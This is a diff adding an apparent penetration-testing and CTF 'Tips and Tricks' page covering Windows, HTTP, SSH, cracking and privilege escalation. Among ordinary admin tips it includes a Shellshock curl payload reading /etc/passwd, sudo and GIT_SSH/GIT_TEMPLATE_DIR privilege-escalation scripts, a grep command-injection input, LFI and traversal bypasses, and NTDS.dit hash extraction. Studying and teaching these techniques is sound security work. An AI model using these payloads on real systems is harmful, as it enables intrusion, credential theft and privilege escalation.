@@ -1,0 +1,1367 @@
+***************
+Tips and Tricks
+***************
+
+Windows
+-------
+
+Get-ChildItem Mode Values
+^^^^^^^^^^^^^^^^^^^^^^^^^
+
+'Mode' values returned by PowerShell's Get-ChildItem cmdlet?
+
+::
+
+ PS> gci|select mode,attributes -u
+
+ Mode                Attributes
+ ----                ----------
+ d-----               Directory
+ d-r---     ReadOnly, Directory
+ d----l Directory, ReparsePoint
+ -a----                 Archive
+
+In any case, the full list is:
+
+::
+
+ d - Directory
+ a - Archive
+ r - Read-only
+ h - Hidden
+ s - System
+ l - Reparse point, symlink, etc.
+
+Zip or unzip using ONLY Windows' built-in capabilities? 
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+Powershell way
+
+::
+
+ Add-Type -A System.IO.Compression.FileSystem
+ [IO.Compression.ZipFile]::CreateFromDirectory('foo', 'foo.zip')
+ [IO.Compression.ZipFile]::ExtractToDirectory('foo.zip', 'bar')
+
+Alternate Data Stream
+^^^^^^^^^^^^^^^^^^^^^
+Sometimes, `Alternate Data Stream <https://blogs.technet.microsoft.com/askcore/2013/03/24/alternate-data-streams-in-ntfs/>`_ can be used to hide data in streams.
+
+The output shows not only the name of the ADS and its size, but also the unnamed data stream and its size is also listed (shown as :$DATA).
+
+Powershell-Way
+
+::
+
+ PS > Get-Item -Path C:\Users\Administrator\example.zip -stream *
+
+ Filename: C:\Users\Administrator\example.zip
+
+ Stream             Length
+ ------             -------
+ :$DATA             8
+ pass.txt           4
+
+Now, we know the name of the ADS, We can use the Get-Content cmdlet to query its contents.
+
+::
+
+ Get-Content -Path C:\Users\Administrator\example.zip -Stream pass.txt
+ The password is Passw0rd!
+
+Check a directory for ADS?
+
+::
+
+ gci -recurse | % { gi $_.FullName -stream * } | where stream -ne ':$Data'
+
+DIR Way
+
+Current directory ADS Streams
+
+::
+
+ dir /r | find ":$DATA"
+
+Sub-directories too
+
+::
+
+ dir   /s /r | find ":$DATA"
+
+Reading the hidden stream
+
+::
+
+ more < testfile.txt:hidden_stream::$DATA
+
+We may also utilze `List Alternate Data Streams <https://github.com/codejanus/ToolSuite/blob/master/lads.exe>`_ LADS tool to figure out Alternate Data Streams.
+
+Redirecting Standard Out and Standard Error from PowerShell Start-Process
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+Often reverse shells will not display standard error. Sometimes they will not display standard out when a new process is started. The following will redirect standard out and standard error to text files when PowerShell starts a new process.
+
+::
+
+ PS C:\> Start-Process -FilePath C:\users\administrator\foo.txt -NoNewWindow -PassThru -Wait -RedirectStandardOutput stdout.txt -RedirectStandardError stderr.txt
+
+`Powershell Start-Process Module Documentation <https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/start-process>`_.
+
+
+NTDS.dit and SYSTEM hive
+^^^^^^^^^^^^^^^^^^^^^^^^^
+
+If you have found files such as 
+
+::
+
+ IP_psexec.ntdsgrab._333512.dit: Extensible storage engine DataBase, version 0x620, checksum 0x16d44752, page size 8192, DirtyShutdown, Windows version 6.1
+ IP_psexec.ntdsgrab._089134.bin: MS Windows registry file, NT/2000 or above
+
+Probably, there are dump of domain controller NTDS.dit file, from which passwords can be extracted. Utilize,
+
+::
+
+ python secretsdump.py -ntds /root/ntds_cracking/ntds.dit -system /root/ntds_cracking/systemhive LOCAL
+
+
+Recovering password from System.Security.SecureString
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+If we have windows credentials stored as System.Security.SecureString, we can use
+
+::
+
+ $BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($SecurePassword)
+ $UnsecurePassword = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)
+
+or 
+
+::
+
+ $UnsecurePassword = (New-Object PSCredential "user",$SecurePassword).GetNetworkCredential().Password
+
+Example:
+
+::
+
+ PS> $PlainPassword = Read-Host -AsSecureString  "Enter password"
+ PS> Enter password: ***
+ PS> $PlainPassword
+ PS> System.Security.SecureString
+ PS> $UnsecurePassword1 = (New-Object PSCredential "user",$PlainPassword).GetNetworkCredential().Password
+ PS> $UnsecurePassword1
+ PS> yum
+
+Copy To or From a PowerShell Session
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+This is a awesome feature to copy files from different computers on which we have a WinRM or Remote PS Session. Directly taken from `Copy To or From a PowerShell Session <https://blogs.technet.microsoft.com/poshchap/2015/10/30/copy-to-or-from-a-powershell-session/>`_
+
+* Copy Local files to a remote session :
+ 
+ ::
+
+  ##Initialize the session
+  $TargetSession = New-PSSession -ComputerName HALOMEM03
+
+  ##  Copy Files from Local session to remote session
+  Copy-Item -ToSession $TargetSession -Path "C:\Users\Administrator\desktop\scripts\" -Destination "C:\Users\administrator.HALO\desktop\" -Recurse
+
+* Copy some files from a remote session to the local server:
+
+  ::
+
+   ## Create the session
+   $SourceSession = New-PSSession -ComputerName HALODC01
+
+   ## Copy from Remote machine to Local machine
+   Copy-Item -FromSession $SourceSession -Path "C:\Users\Administrator\desktop\scripts\" -Destination "C:\Users\administrator\desktop\" -Recurse
+
+Get-Hash
+^^^^^^^^
+
+`Get-FileHash <https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/get-filehash>`_ Computes the hash value for a file by using a specified hash algorithm.
+
+::
+
+ PS > Get-FileHash Hello.rst                                                                                                                                                        
+
+ Algorithm       Hash                                                                   Path                                                                                                                                                                            
+ ---------       ----                                                                   ----                                                                                                                                                                            
+ SHA256          8A7D37867537DB78A74A473792928F14EDCB3948B9EB11A48D6DE38B3DD30EEC       /tmp/Hello.rst                                                                                   
+
+Active Directory Enumeration and Remote Code Execution
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+Probably, refer  :doc:`LFF-IPS-P3-Exploitation`
+
+It contains
+
+* Active Directory Reconnaissance : Information about active directory enumeration with Domain User rights by various methods such as rpclient, enum4linux, nltest, netdom, powerview, bloodhound, adexplorer, Jexplorer, Remote Server Administration Tools, Microsoft Active Directory Topology Diagrammer, reconnaissance using powershell, powershell adsisearcher etc.
+* Remote Code Execution Methods : Information about multiple ways to get a execute remote commands on the remote machine such winexe, crackmapexec, impacket psexec, smbexec, wmiexec, Metasploit psexec, Sysinternals psexec, task scheduler, scheduled tasks, service controller (sc), remote registry, WinRM, WMI, DCOM, Mimikatz Pass the hash/ Pass the ticket, remote desktop etc.
+
+Others
+^^^^^^
+
+* Invoking Net Use using Credentials to mount remote system
+
+ The below example executes command on file.bitvijays.local computer with Domain Administrator credentials and utilizes net use to mount Domain Controller C Drive and read a particular file
+ ::
+
+   Invoke-Command -ComputerName file.bitvijays.local -Credential $credential -ScriptBlock {net use x: \\dc.bitvijays.local\C$ /user:bitvijays.local\domainadministrator_user DA_Passw0rd!; type x:\users\administrator\desktop\imp.txt}
+
+
+Wget
+----
+
+FTP via Wget
+^^^^^^^^^^^^
+
+If ftp anonymous login is provided or you have login details, you can download the contents by wget, (For anonymous login user password are not required)
+
+::
+
+  wget -rq ftp://IP --ftp-user=username --ftp-password=password
+
+wgetrc Commands
+^^^^^^^^^^^^^^^
+
+::
+
+ output_document = file -- Set the output filename—the same as ‘-O file’.
+ post_data = string -- Use POST as the method for all HTTP requests and send string in the request body. The same as ‘--post-data=string’.
+ post_file = file   -- Use POST as the method for all HTTP requests and send the contents of file in the request body. The same as ‘--post-file=file’.
+ -P prefix
+ --directory-prefix=prefix
+   Set directory prefix to prefix.  The directory prefix is the directory where all other files and subdirectories will be saved to, i.e. the top of the retrieval tree.  The default is . (the current directory).
+
+Tricks
+^^^^^^
+
+* The interesting part with -P Parameter is you can save the file in /tmp if your current directory is /. Let me explain, Let's say, your current directory is /home/user/ if we do
+
+ ::
+
+  wget IPAddress -P tmp
+
+ it would create a tmp folder in the /home/user/ and save the file in that. However, if you current directory is /, it would save the file in /tmp folder, from where you can execute stuff.
+
+* wget accepts IP address in decimal format
+
+* wget shortens the filename if it's too long. For example, if you provide a filename to the wget which is very long (i.e around 255 character), wget might shorten it. This might be helpful in cases where only a jpg file is allowed to be uploaded, however as wget shortens it, we may try aaaaaaaaaaaa (*255/ somenumber).php.jpg and wget shortens it to aaaaaaa(*255).php
+
+SSH
+---
+
+ssh_config
+^^^^^^^^^^
+If you know the password of the user, however, ssh is not allowing you to login, check ssh_config.
+
+::
+
+   ## Tighten security after security incident 
+   ## root never gets to log in remotely PermitRootLogin no 
+   ## Eugene & Margo can SSH in, no-one else allowed 
+   AllowUsers example_user1 example_user2 
+   ## SSH keys only but example_user1 can use a password 
+   Match user example_user1 
+   PasswordAuthentication yes 	
+   ## End tighten security
+
+
+HTTP
+----
+
+First things
+^^^^^^^^^^^^
+
+* View Source of the web-page (Ctrl+U).
+* Inspect element of the web-page (F12).
+* See if there is any hint in the title of the web page. (example: /Magic).
+* Check the scroll button! Sometimes, there are too many lines and something hidden in the end of the webpage!
+* Check for any long file names such admin_5f4dcc3b5aa765d61d8327deb882cf99.txt; Such long names can be base64-encoded, hex, md5 etc.
+* If any login page is implemented asking for username and password. Check how it is implemented? Is it using any open-source authentication modules? If so, look if there are any default passwords for that.
+* If there's a page where redirect is happening (for example, http://example.com or http://example.com/support.php redirects us to http://example.com/login.php) However, the response size for example.com or support.php is a bit off, especially considering the page gives a 302 redirect. We may use No-redirect extension from firefox and view the page. We may also utilize curl/ burp to view the response.
+* `List of HTTP Headers <https://en.wikipedia.org/wiki/List_of_HTTP_header_fields>`_ : Quite important when you want to set headers/ cookies etc.
+* Watch for places where the site redirects you (it adds something to the URL and displays the homepage). If you see that happen, try adjusting the URL manually. for example: 
+  when browsing 
+
+ ::
+
+   http://IPAddress/SitePages/
+
+ it redirects to 
+
+ :: 
+
+  http://IPAddress/_layouts/15/start.aspx#/SitePages/Forms/AllPages.aspx
+
+ we may find something by adjusting the URL manually to 
+
+ ::
+
+  http://IPAddress/SitePages/Forms/AllPages.aspx
+
+
+CSC Austria: CTF Tips and Tricks
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+Refer `SEC Consult – Cyber Security Challenge Austria /CTF Tips & Tricks <https://security-hub.at/download/csc_austria_ctf_tips_and_tricks.pdf>`_
+
+* Read the source code / comments
+* Check for common hidden files / folders (.git, .ssh, robots.txt, backup, .DS_Store, .svn, changelog.txt, server-status, admin, administrator, …)
+* Check for common extensions (Example: If you see a index.php file, check index.php.tmp, index.php.bak, and so on)
+* Play with the URL / parameters / cookies (Example: If you have a page with index.php?role=user try to change it to index.php?role=admin).
+* Get familiar with the website, it’s functionalities and features before starting an in-depth analysis.
+* Try to map the full attack-surface of the website! Some vulnerabilities are hidden deep in hard-to-reach functionalities.
+* Test for the most common vulnerabilities like SQLi (SQL Injection), XXE (XML Entity Injection), Path Traversal, File Uploads, Command Injection, Cookie Tampering, XSS (Cross-Site-Scripting), XPATH Injection, Unserialization bugs, Outdated software, CSRF 
+  (Cross-Site-Request-Forgery), SSRF (Server-Side-Request-Forgery), SSTI (Server-Side Template Injection), LFI/RFI (Local-File-Inclusion / Remote-File-Inclusion), Flaws in Session Management or Authorization Flaws, the randomness of the cookies, and so on.
+* If you come across a technology which you don’t know, try to google security writeups for these technologies.
+* Try special characters 
+  ::
+  
+    (‘, “, {, ;, |, &&, \, /, !(), %…) 
+    
+ in all input fields (GET- and POST parameters and Cookies) and check for uncommon responses or error messages.
+* To detect blind vulnerabilities (SQL injection, command injection, XSS, …) you can use time delays or requests to one of your web servers (check the access logs).
+* If you can provide a path or a filename to the website, you should test for path traversal vulnerabilities. If the application replaces the 
+  ::
+   
+   “../” 
+ with an empty string, you can try to bypass it by injecting the sequence two times, like: 
+ ::
+ 
+  “…/./”. 
+  
+ If the “../” in the center gets replaced, the application will again work with “../”. You can also try different encodings or other removed characters. Moreover, you can try to create or upload (e.g. via archives) a symbolic link.
+* If you found a LFI (local-file-inclusion) vulnerability in a PHP website and you want to read the PHP scripts, you can use php-filter (you can’t normally read .php files because the inclusion would try to execute the code instead of displaying it; 
+  with php-filter you can first base64-encode the content to display it): 
+
+ ::
+ 
+  index.php?filename=php://filter/convert.base64-encode/resource=index.php
+
+htaccess - UserAgent
+^^^^^^^^^^^^^^^^^^^^
+When you see something like this "Someone's sup3r s3cr3t dr0pb0x - only me and Steve Jobs can see this content". Which says, only this can see me. Try to see what user-agent it is talking about. The way it is implemented is by use of .htaccess file
+
+:: 
+
+   cat .htaccess 
+   BrowserMatchNoCase "iPhone" allowed
+
+   Order Deny,Allow 
+   Deny from ALL 
+   Allow from env=allowed 
+   ErrorDocument 403 “<H1>Super secret location - only me and Steve Jobs can see this content</H1><H2>Lol</H2>”
+
+CGI-BIN Shellshock
+^^^^^^^^^^^^^^^^^^
+To understand shellshock few blogs can be referred such as `ShellShocked – A quick demo of how easy it is to exploit <https://www.surevine.com/shellshocked-a-quick-demo-of-how-easy-it-is-to-exploit/>`_ , `Inside Shellshock: How hackers are using it to exploit systems <https://blog.cloudflare.com/inside-shellshock/>`_
+
+::
+
+  curl -H "User-Agent: () { :; }; echo 'Content-type: text/html'; echo; /bin/cat /etc/passwd" http://192.168.56.2:591/cgi-bin/cat
+
+It is important to understand what is cgi-bin which can be read from `Creating CGI Programs with Bash: Getting Started <http://www.team2053.org/docs/bashcgi/gettingstarted.html>`_ . Also the most important lines in this file are:
+
+::
+
+  echo "Content-type: text/html"
+  echo ""
+ 
+These two lines tell your browser that the rest of the content coming from the program is HTML, and should be treated as such. Leaving these lines out will often cause your browser to download the output of the program to disk as a text file instead of displaying it, since it doesn't understand that it is HTML!
+
+**Shellshock Local Privilege Escalation**
+
+Binaries with a setuid bit and calling (directly or indirectly) bash through execve, popen or system are tools which may be used to activate the Shell Shock bug.
+
+::
+
+  sudo PS1="() { :;} ;  /bin/sh" /home/username/suidbinary
+
+Shellshock also affects DHCP as mentioned `Shellshock DHCP RCE Proof of Concept <https://www.trustedsec.com/september-2014/shellshock-dhcp-rce-proof-concept/>`_ There's a metasploit module named "Dhclient Bash Environment Variable Injection (Shellshock)" for this.
+
+XSS/ HTML Injection
+^^^^^^^^^^^^^^^^^^^
+
+The below will redirect the page to google.com
+
+::
+ 
+  <META http-equiv=“refresh” content=“0;URL=http://www.google.com”>
+
+curl
+^^^^
+
+:: 
+
+    -k, --insecure
+    (SSL) This option explicitly allows curl to perform "insecure" SSL connections and transfers. All SSL connections are attempted to be made secure by using the CA certificate  bundle  installed  by  default.
+    This makes all connections considered "insecure" fail unless -k, --insecure is used.
+
+    -I, --head
+    (HTTP/FTP/FILE) Fetch the HTTP-header only! HTTP-servers feature the command HEAD which this uses to get nothing but the header of a document. When used on an FTP or FILE file, curl displays the  file  size and last modification time only.
+
+HTTP Referer
+^^^^^^^^^^^^
+
+The Referer request header contains the address of the previous web page from which a link to the currently requested page was followed. The Referer header allows servers to identify where people are visiting them from and may use that data for analytics, logging, or optimized caching.
+
+::
+   
+  Referer: <url>
+
+  <url> An absolute or partial address of the previous web page from which a link to the currently requested page was followed. URL fragments (i.e. "#section") are not included.
+
+Data-URI
+^^^^^^^^^
+`Basics of HTTP Data URI <https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics\_of\_HTTP/Data\_URIs>`_
+
+Login-Pages
+^^^^^^^^^^^
+To test login pages, we may use burpsuite intruder and check for different length of response.
+
+Delete Tags
+^^^^^^^^^^^
+Delete all lines between tags including tags:
+
+::
+   
+  sed '/<tag>/,/<\/tag>/d' input.txt
+
+.. Tip :: Useful when you are accessing the webpage using curl and their LFI and you want to remove the html/ body tags.
+
+HTTP 404 Custom Page
+^^^^^^^^^^^^^^^^^^^^
+Sometimes, it's a good idea to look at 404 custom page also. There might be some information stored.
+
+Password Protected File
+------------------------
+	  
+ZIP File
+^^^^^^^^
+
+run fcrackzip
+
+:: 
+
+    fcrackzip -D -u -p /tmp/rockyou2.txt flag.zip
+
+    -D, --dictionary:    Select dictionary mode. In this mode, fcrackzip will read passwords from a file, which must contain one password per line and should be alphabetically sorted (e.g. using sort(1)).
+    -p, --init-password string :  Set initial (starting) password for brute-force searching to string, or use the file with the name string to supply passwords for dictionary searching.
+    -u, --use-unzip: Try to decompress the first file by calling unzip with the guessed password. This weeds out false positives when not enough files have been given.
+
+rar2john
+^^^^^^^^
+We can get the password hash of a password protected rar file by using rar2john
+
+:: 
+
+    [root:~/Downloads]# rar2john crocs.rar
+    file name: artwork.jpg
+    crocs.rar:$RAR3$*1*35c0eaaed4c9efb9*463323be*140272*187245*0*crocs.rar*76*35:1::artwork.jpg
+
+keepass2john
+^^^^^^^^^^^^
+
+::
+
+ keepass2john user.kdbx 
+ user:$keepass$*2*6000*222*f362b5565b916422607711b54e8d0bd20838f5111d33a5eed137f9d66a375efb*3f51c5ac43ad11e0096d59bb82a59dd09cfd8d2791cadbdb85ed3020d14c8fea*3f759d7011f43b30679a5ac650991caa*b45da6b5b0115c5a7fb688f8179a19a749338510dfe90aa5c2cb7ed37f992192*535a85ef5c9da14611ab1c1edc4f00a045840152975a4d277b3b5c4edc1cd7da
+
+::
+
+ john --wordlist=/usr/share/wordlists/rockyou.txt --format=keepass hashfile
+
+There are other \*2john thingy
+
+::
+
+ dmg2john
+ gpg2john
+ hccap2john
+ keepass2john
+ keychain2john
+ keyring2john
+ keystore2john
+ kwallet2john
+ luks2john
+ pfx2john
+ putty2john
+ pwsafe2john
+ racf2john
+ rar2john
+ ssh2john
+ truecrypt_volume2john
+ uaf2john
+ wpapcap2john
+ zip2john
+ 7z2john
+
+
+Encrypted Files
+---------------
+
+Many times during the challenges, we do find encrypted files encrypted by Symmetric key encryption or RSA Public-Private Key encryption
+
+Symmetric Key
+^^^^^^^^^^^^^
+
+If we have the encrypted file and the key to it. However, we don't know the encryption scheme such as aes-128-cbc, des-cbc.
+
+We can use the code written by superkojiman in `De-ICE Hacking Challenge Part-1 <https://blog.techorganic.com/2011/07/19/de-ice-hacking-challenge-part-1/>`_ , it would tell you what encryption scheme is used and then we can run the command to retrieve the plaintext.
+
+::
+
+ ciphers=`openssl list-cipher-commands`
+ for i in $ciphers; do
+  openssl enc -d -${i} -in <encrypted-file> -k <password/ keyfile> > /dev/null 2>&1
+  if [[ $? -eq 0 ]]; then
+   echo "Cipher is $i: openssl enc -d -${i} -in <encrypted-file> -k <password/ keyfile> -out foo.txt"
+   exit
+  fi
+ done
+
+RSA Public-Private Key encryption
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+If we have found a weak RSA public, we can use `RsaCtfTool <https://github.com/Ganapati/RsaCtfTool>`_ uncipher data from weak public key and try to recover private key and then use 
+
+::
+
+ openssl rsautl -decrypt -inkey privatekey.pem -in <encryptedfile> -out key.bin 
+
+The ciphertext should be in binary format for RsaCtfTool to work. If you have your ciphertext in hex, for example
+
+::
+
+ 5e14f2c53cbc04b82a35414dc670a8a474ee0021349f280bfef215e23d40601a
+
+Convert it in to binary using
+
+::
+
+ xxd -r -p ciphertext > ciphertext3
+
+
+RSA given q, p and e?
+^^^^^^^^^^^^^^^^^^^^^
+
+Taken from `RSA Given q,p and e <https://crypto.stackexchange.com/questions/19444/rsa-given-q-p-and-e>`_
+
+::
+
+ def egcd(a, b):
+    x,y, u,v = 0,1, 1,0
+    while a != 0:
+        q, r = b//a, b%a
+        m, n = x-u*q, y-v*q
+        b,a, x,y, u,v = a,r, u,v, m,n
+        gcd = b
+    return gcd, x, y
+
+ def main():
+
+    p = 1090660992520643446103273789680343
+    q = 1162435056374824133712043309728653
+    e = 65537
+    ct = 299604539773691895576847697095098784338054746292313044353582078965
+
+    # compute n
+    n = p * q
+
+    # Compute phi(n)
+    phi = (p - 1) * (q - 1)
+
+    # Compute modular inverse of e
+    gcd, a, b = egcd(e, phi)
+    d = a
+
+    print( "n:  " + str(d) );
+
+    # Decrypt ciphertext
+    pt = pow(ct, d, n)
+    print( "pt: " + str(pt) )
+
+ if __name__ == "__main__":
+    main()
+
+
+SECCURE Elliptic Curve Crypto Utility for Reliable Encryption
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+If you see, something like this
+
+::
+
+ '\x00\x146\x17\xe9\xc1\x1a\x7fkX\xec\xa0n,h\xb4\xd0\x98\xeaO[\xf8\xfa\x85\xaa\xb37!\xf0j\x0e\xd4\xd0\x8b\xfe}\x8a\xd2+\xf2\xceu\x07\x90K2E\x12\x1d\xf1\xd8\x8f\xc6\x91\t<w\x99\x1b9\x98'
+
+it's probably `SECCURE Elliptic Curve Crypto Utility for Reliable Encryption <http://point-at-infinity.org/seccure/>`_ Utilize python module `seccure <https://pypi.python.org/pypi/seccure>`_ to get the plaintext. 
+
+GPG
+^^^
+
+Where are the GPG Keys stored?
+
+By default in ~/.gnupg/ and can be found using 
+
+::
+
+ gpg -K
+
+Network Information
+-------------------
+
+
+Sometimes, ifconfig and netstat are not present on the system. If so, check if ip and ss are installed?
+
+ip
+^^
+
+::
+
+  ip addr
+    
+   1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+   17: wwan0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 1000
+      link/ether b2:06:fe:2b:73:c6 brd ff:ff:ff:ff:ff:ff
+     inet 14.97.194.148/30 brd 14.97.194.151 scope global dynamic noprefixroute wwan0
+       valid_lft 5222sec preferred_lft 5222sec
+
+hostname
+^^^^^^^^
+
+We can also check the ipaddress of the host using hostname command
+
+::
+
+ hostname -I
+ 172.17.0.1 14.97.194.148 
+
+ss
+^^
+
+ss - another utility to investigate sockets
+
+::
+
+ ss
+ 
+       -n, --numeric
+              Do not try to resolve service names.
+     -l, --listening
+              Display only listening sockets (these are omitted by default).
+       -t, --tcp
+              Display TCP sockets.
+
+       -u, --udp
+              Display UDP sockets.
+
+
+User Home Directory
+-------------------
+
+If we find that home directory contains
+
+Firefox/ Thunderbird/ Seabird
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+We can utilize `Firefox Decrypt <https://github.com/unode/firefox_decrypt>`_ is a tool to extract passwords from Mozilla (Firefox/ Thunderbird/ Seabird) profiles. It can be used to recover passwords from a profile protected by a Master Password as long as the latter is known. If a profile is not protected by a Master Password, a password will still be requested but can be left blank.
+
+Sudoers file
+------------
+
+If the sudoers file contains: 
+	
+secure_path
+^^^^^^^^^^^
+Path used for every command run from sudo. If you don't trust the people running sudo to have a sane PATH environment variable you may want to use this. Another use is if you want to have the “root path” be separate from the “user path”. Users in the group specified by the exempt_group option are not affected by secure_path. This option is not set by default.
+
+env_reset
+^^^^^^^^^
+If set, sudo will run the command in a minimal environment containing the TERM, PATH, HOME, MAIL, SHELL, LOGNAME, USER, USERNAME and SUDO_* variables. Any variables in the caller's environment that match the env_keep and env_check lists are then added, followed by any variables present in the file specified by the env_file option (if any). The contents of the env_keep and env_check lists, as modified by global Defaults parameters in sudoers, are displayed when sudo is run by root with the -V option. If the secure_path option is set, its value will be used for the PATH environment variable. This flag is on by default.
+
+mail_badpass
+^^^^^^^^^^^^
+Send mail to the mailto user if the user running sudo does not enter the correct password. If the command the user is attempting to run is not permitted by sudoers and one of the mail_all_cmnds, mail_always, mail_no_host, mail_no_perms or mail_no_user flags are set, this flag will have no effect. This flag is off by default.
+
+run-parts
+---------
+
+run-parts runs all the executable files named, found in directory directory. This is mainly useful when we are waiting for the cron jobs to run. It can be used to execute scripts present in a folder.
+
+:: 
+
+  run-parts /etc/cron.daily
+
+Java keystore file
+------------------
+
+Refer `Java Keytool essentials working with java keystores <https://www.digitalocean.com/community/tutorials/java-keytool-essentials-working-with-java-keystores>`_ and `openssl essentials working with ssl certificates private keys and csrs <https://www.digitalocean.com/community/tutorials/openssl-essentials-working-with-ssl-certificates-private-keys-and-csrs#convert-certificate-formats>`_
+
+Cracking MD5 Hashes
+-------------------
+
+Try `Crackstation <https://crackstation.net/>`_ or `ISC Reverse hash <https://isc.sans.edu/tools/reversehash.html>`_
+
+Steghide
+--------
+Looking for hidden text in the images? Utilize steghide
+
+::
+
+  steghide version 0.5.1
+
+  the first argument must be one of the following:
+  embed, --embed          embed data
+  extract, --extract      extract data
+  info, --info            display information about a cover- or stego-file
+  info <filename>       display information about <filename>
+  encinfo, --encinfo      display a list of supported encryption algorithms
+  version, --version      display version information
+  license, --license      display steghide's license
+  help, --help            display this usage information
+
+.. Tip :: Sometimes, there is no password, so just press enter.
+
+Git client Privilege Escalation
+--------------------------------
+Git clients (before versions 1.8.5.6, 1.9.5, 2.0.5, 2.1.4 and 2.2.1) and Mercurial clients (before version 3.2.3) contained three vulnerabilities that allowed malicious Git or Mercurial repositories to execute arbitrary code on vulnerable clients under certain circumstances. Refer `12 Days of HaXmas: Exploiting CVE-2014-9390 in Git and Mercurial <https://community.rapid7.com/community/metasploit/blog/2015/01/01/12-days-of-haxmas-exploiting-cve-2014-9390-in-git-and-mercurial>`_
+
+In one of write-up, `Nicolas Surribas <http://devloop.users.sourceforge.net/>`_ has mentioned about two git environment variables GIT_SSH and GIT_TEMPLATE which can be utilized to do privilege escalation if git clone is performed using a suid binary. Imagine a suid binary utilized to do git clone from a remote directory.
+
+GIT_SSH
+^^^^^^^
+
+If either (GIT_SSH or GIT_SSH_COMMAND) of these environment variables is set then git fetch and git push will use the specified command instead of ssh when they need to connect to a remote system. The command will be given exactly two or four arguments: the username@host (or just host) from the URL and the shell command to execute on that remote system, optionally preceded by -p (literally) and the port from the URL when it specifies something other than the default SSH port. $GIT_SSH_COMMAND takes precedence over $GIT_SSH, and is interpreted by the shell, which allows additional arguments to be included.  $GIT_SSH on the other hand must be just the path to a program (which can be a wrapper shell script, if additional arguments are needed).
+
+::
+
+  echo '#!/bin/bash' > cmd
+  echo 'cp /root/flag.txt /tmp' >> cmd
+  echo 'chmod 777 /tmp/flag.txt' >> cmd
+  GIT_SSH=/home/username/cmd ./setuidbinary(utilizing git clone/ git fetch)
+
+  or
+
+  echo 'chown root:root /home/username/priv ; chmod 4755 /home/username/priv' > ssh
+
+  where priv is binary compiled from suid.c
+
+This basically changes the command from
+
+::
+
+  trace: built-in: git 'clone' 'ssh://root@machine-dev:/root/secret-project' '/mnt/secret-project/'
+
+to
+
+::
+
+  trace: run_command: '/home/user/ssh' 'root@machine-dev' 'git-upload-pack '\''/root/secret-project'\'''
+
+GIT_TEMPLATE_DIR
+^^^^^^^^^^^^^^^^^
+Files and directories in the template directory whose name do not start with a dot will be copied to the $GIT_DIR after it is created. Refer `Git-init <https://git-scm.com/docs/git-init>`_ 
+
+::
+
+  cp -r /usr/share/git-core/templates/ mytemplates
+  cd mytemplates/hooks
+  echo '#!/bin/bash' > post-checkout
+  echo 'cp /root/flag /tmp/flag2' >> post-checkout
+  echo 'chown username.username /tmp/flag2' >> post-checkout
+  chmod +x post-checkout
+  cd ../..
+  GIT_TEMPLATE_DIR=/home/username/mytemplates/ ./setuidbinary( utilizing git clone/ git fetch)
+
+
+Metasploit shell upgrade
+------------------------
+
+In metasploit framework, if we have a shell ( you should try this also, when you are trying to interact with a shell and it dies (happened in a VM), we can upgrade it to meterpreter by using sessions -u
+
+:: 
+
+   sessions -h
+   Usage: sessions [options]
+   
+   Active session manipulation and interaction.
+
+   OPTIONS:
+
+   -u <opt>  Upgrade a shell to a meterpreter session on many platforms
+
+
+
+Truecrypt Files
+---------------
+
+If you have a truecrypt volume to open and crack it's password, we can use truecrack to crack the password and veracrypt to open the truecrypt volume.
+
+:: 
+
+  truecrack --truecrypt <Truecrypt File> -k SHA512 -w <Wordlist_File>
+
+and Veracrypt or cryptsetup to open the file.
+
+::
+
+  cryptsetup open --type tcrypt <Truecrypt> <MountName>
+
+
+
+   
+ 
+Grep in input box?
+------------------
+
+* If the html code contains the below where $key is the input from the user, and we want to read a particular value
+
+  ::
+   
+    passthru("grep -i $key dictionary.txt");
+
+   Remember grep works in a way "grep bitvijays /etc/passwd" is find bitvijays in /etc/passwd. This can be used in reading some files on the disk.
+
+* If the above contains
+
+  ::
+
+   if(preg_match('/[;|&]/',$key)) {
+        print "Input contains an illegal character!";
+        } else {
+        passthru("grep -i $key dictionary.txt");
+    }
+
+ Here we can use ".* /etc/passwd #" 
+
+ This command searches for any character in the file and comments out the reference to dictionary.txt
+
+
+Others
+------
+
+* While downloading files from FTP, make sure that you have set the mode to binary, otherwise downloaded files could be corrupted.
+
+* It is important to check .profile files also. As it might contain scripts which are executed when a user is logged in. Also, it might be important to see how a application is storing password.
+
+* If there's a RCE in some web-application, probably, one of the way to check RCE is to ping your own machine.
+
+* If OPcache engine seemed to be enabled ( check from phpinfo.php file ) which may allow for exploitation (see the following article)https://blog.gosecure.ca/2016/04/27/binary-webshell-through-opcache-in-php-7/
+
+* Identification of OS:
+	
+ :: 
+
+  cat /etc/os-release
+
+  NAME="Ubuntu" VERSION="16.04 LTS (Xenial Xerus)" ID=ubuntu
+  ID\_LIKE=debian PRETTY\_NAME="Ubuntu 16.04 LTS" VERSION\_ID="16.04"
+  HOME\_URL="http://www.ubuntu.com/"
+  SUPPORT\_URL="http://help.ubuntu.com/"
+  BUG\_REPORT\_URL="http://bugs.launchpad.net/ubuntu/"
+  UBUNTU\_CODENAME=xenial
+
+* Many times if IPv6 is enabled, probably you can utilize IPv6 to connect and bypass firewall restrictions ( If firewall is not implemented at IPv6 level - many times it is not ).
+
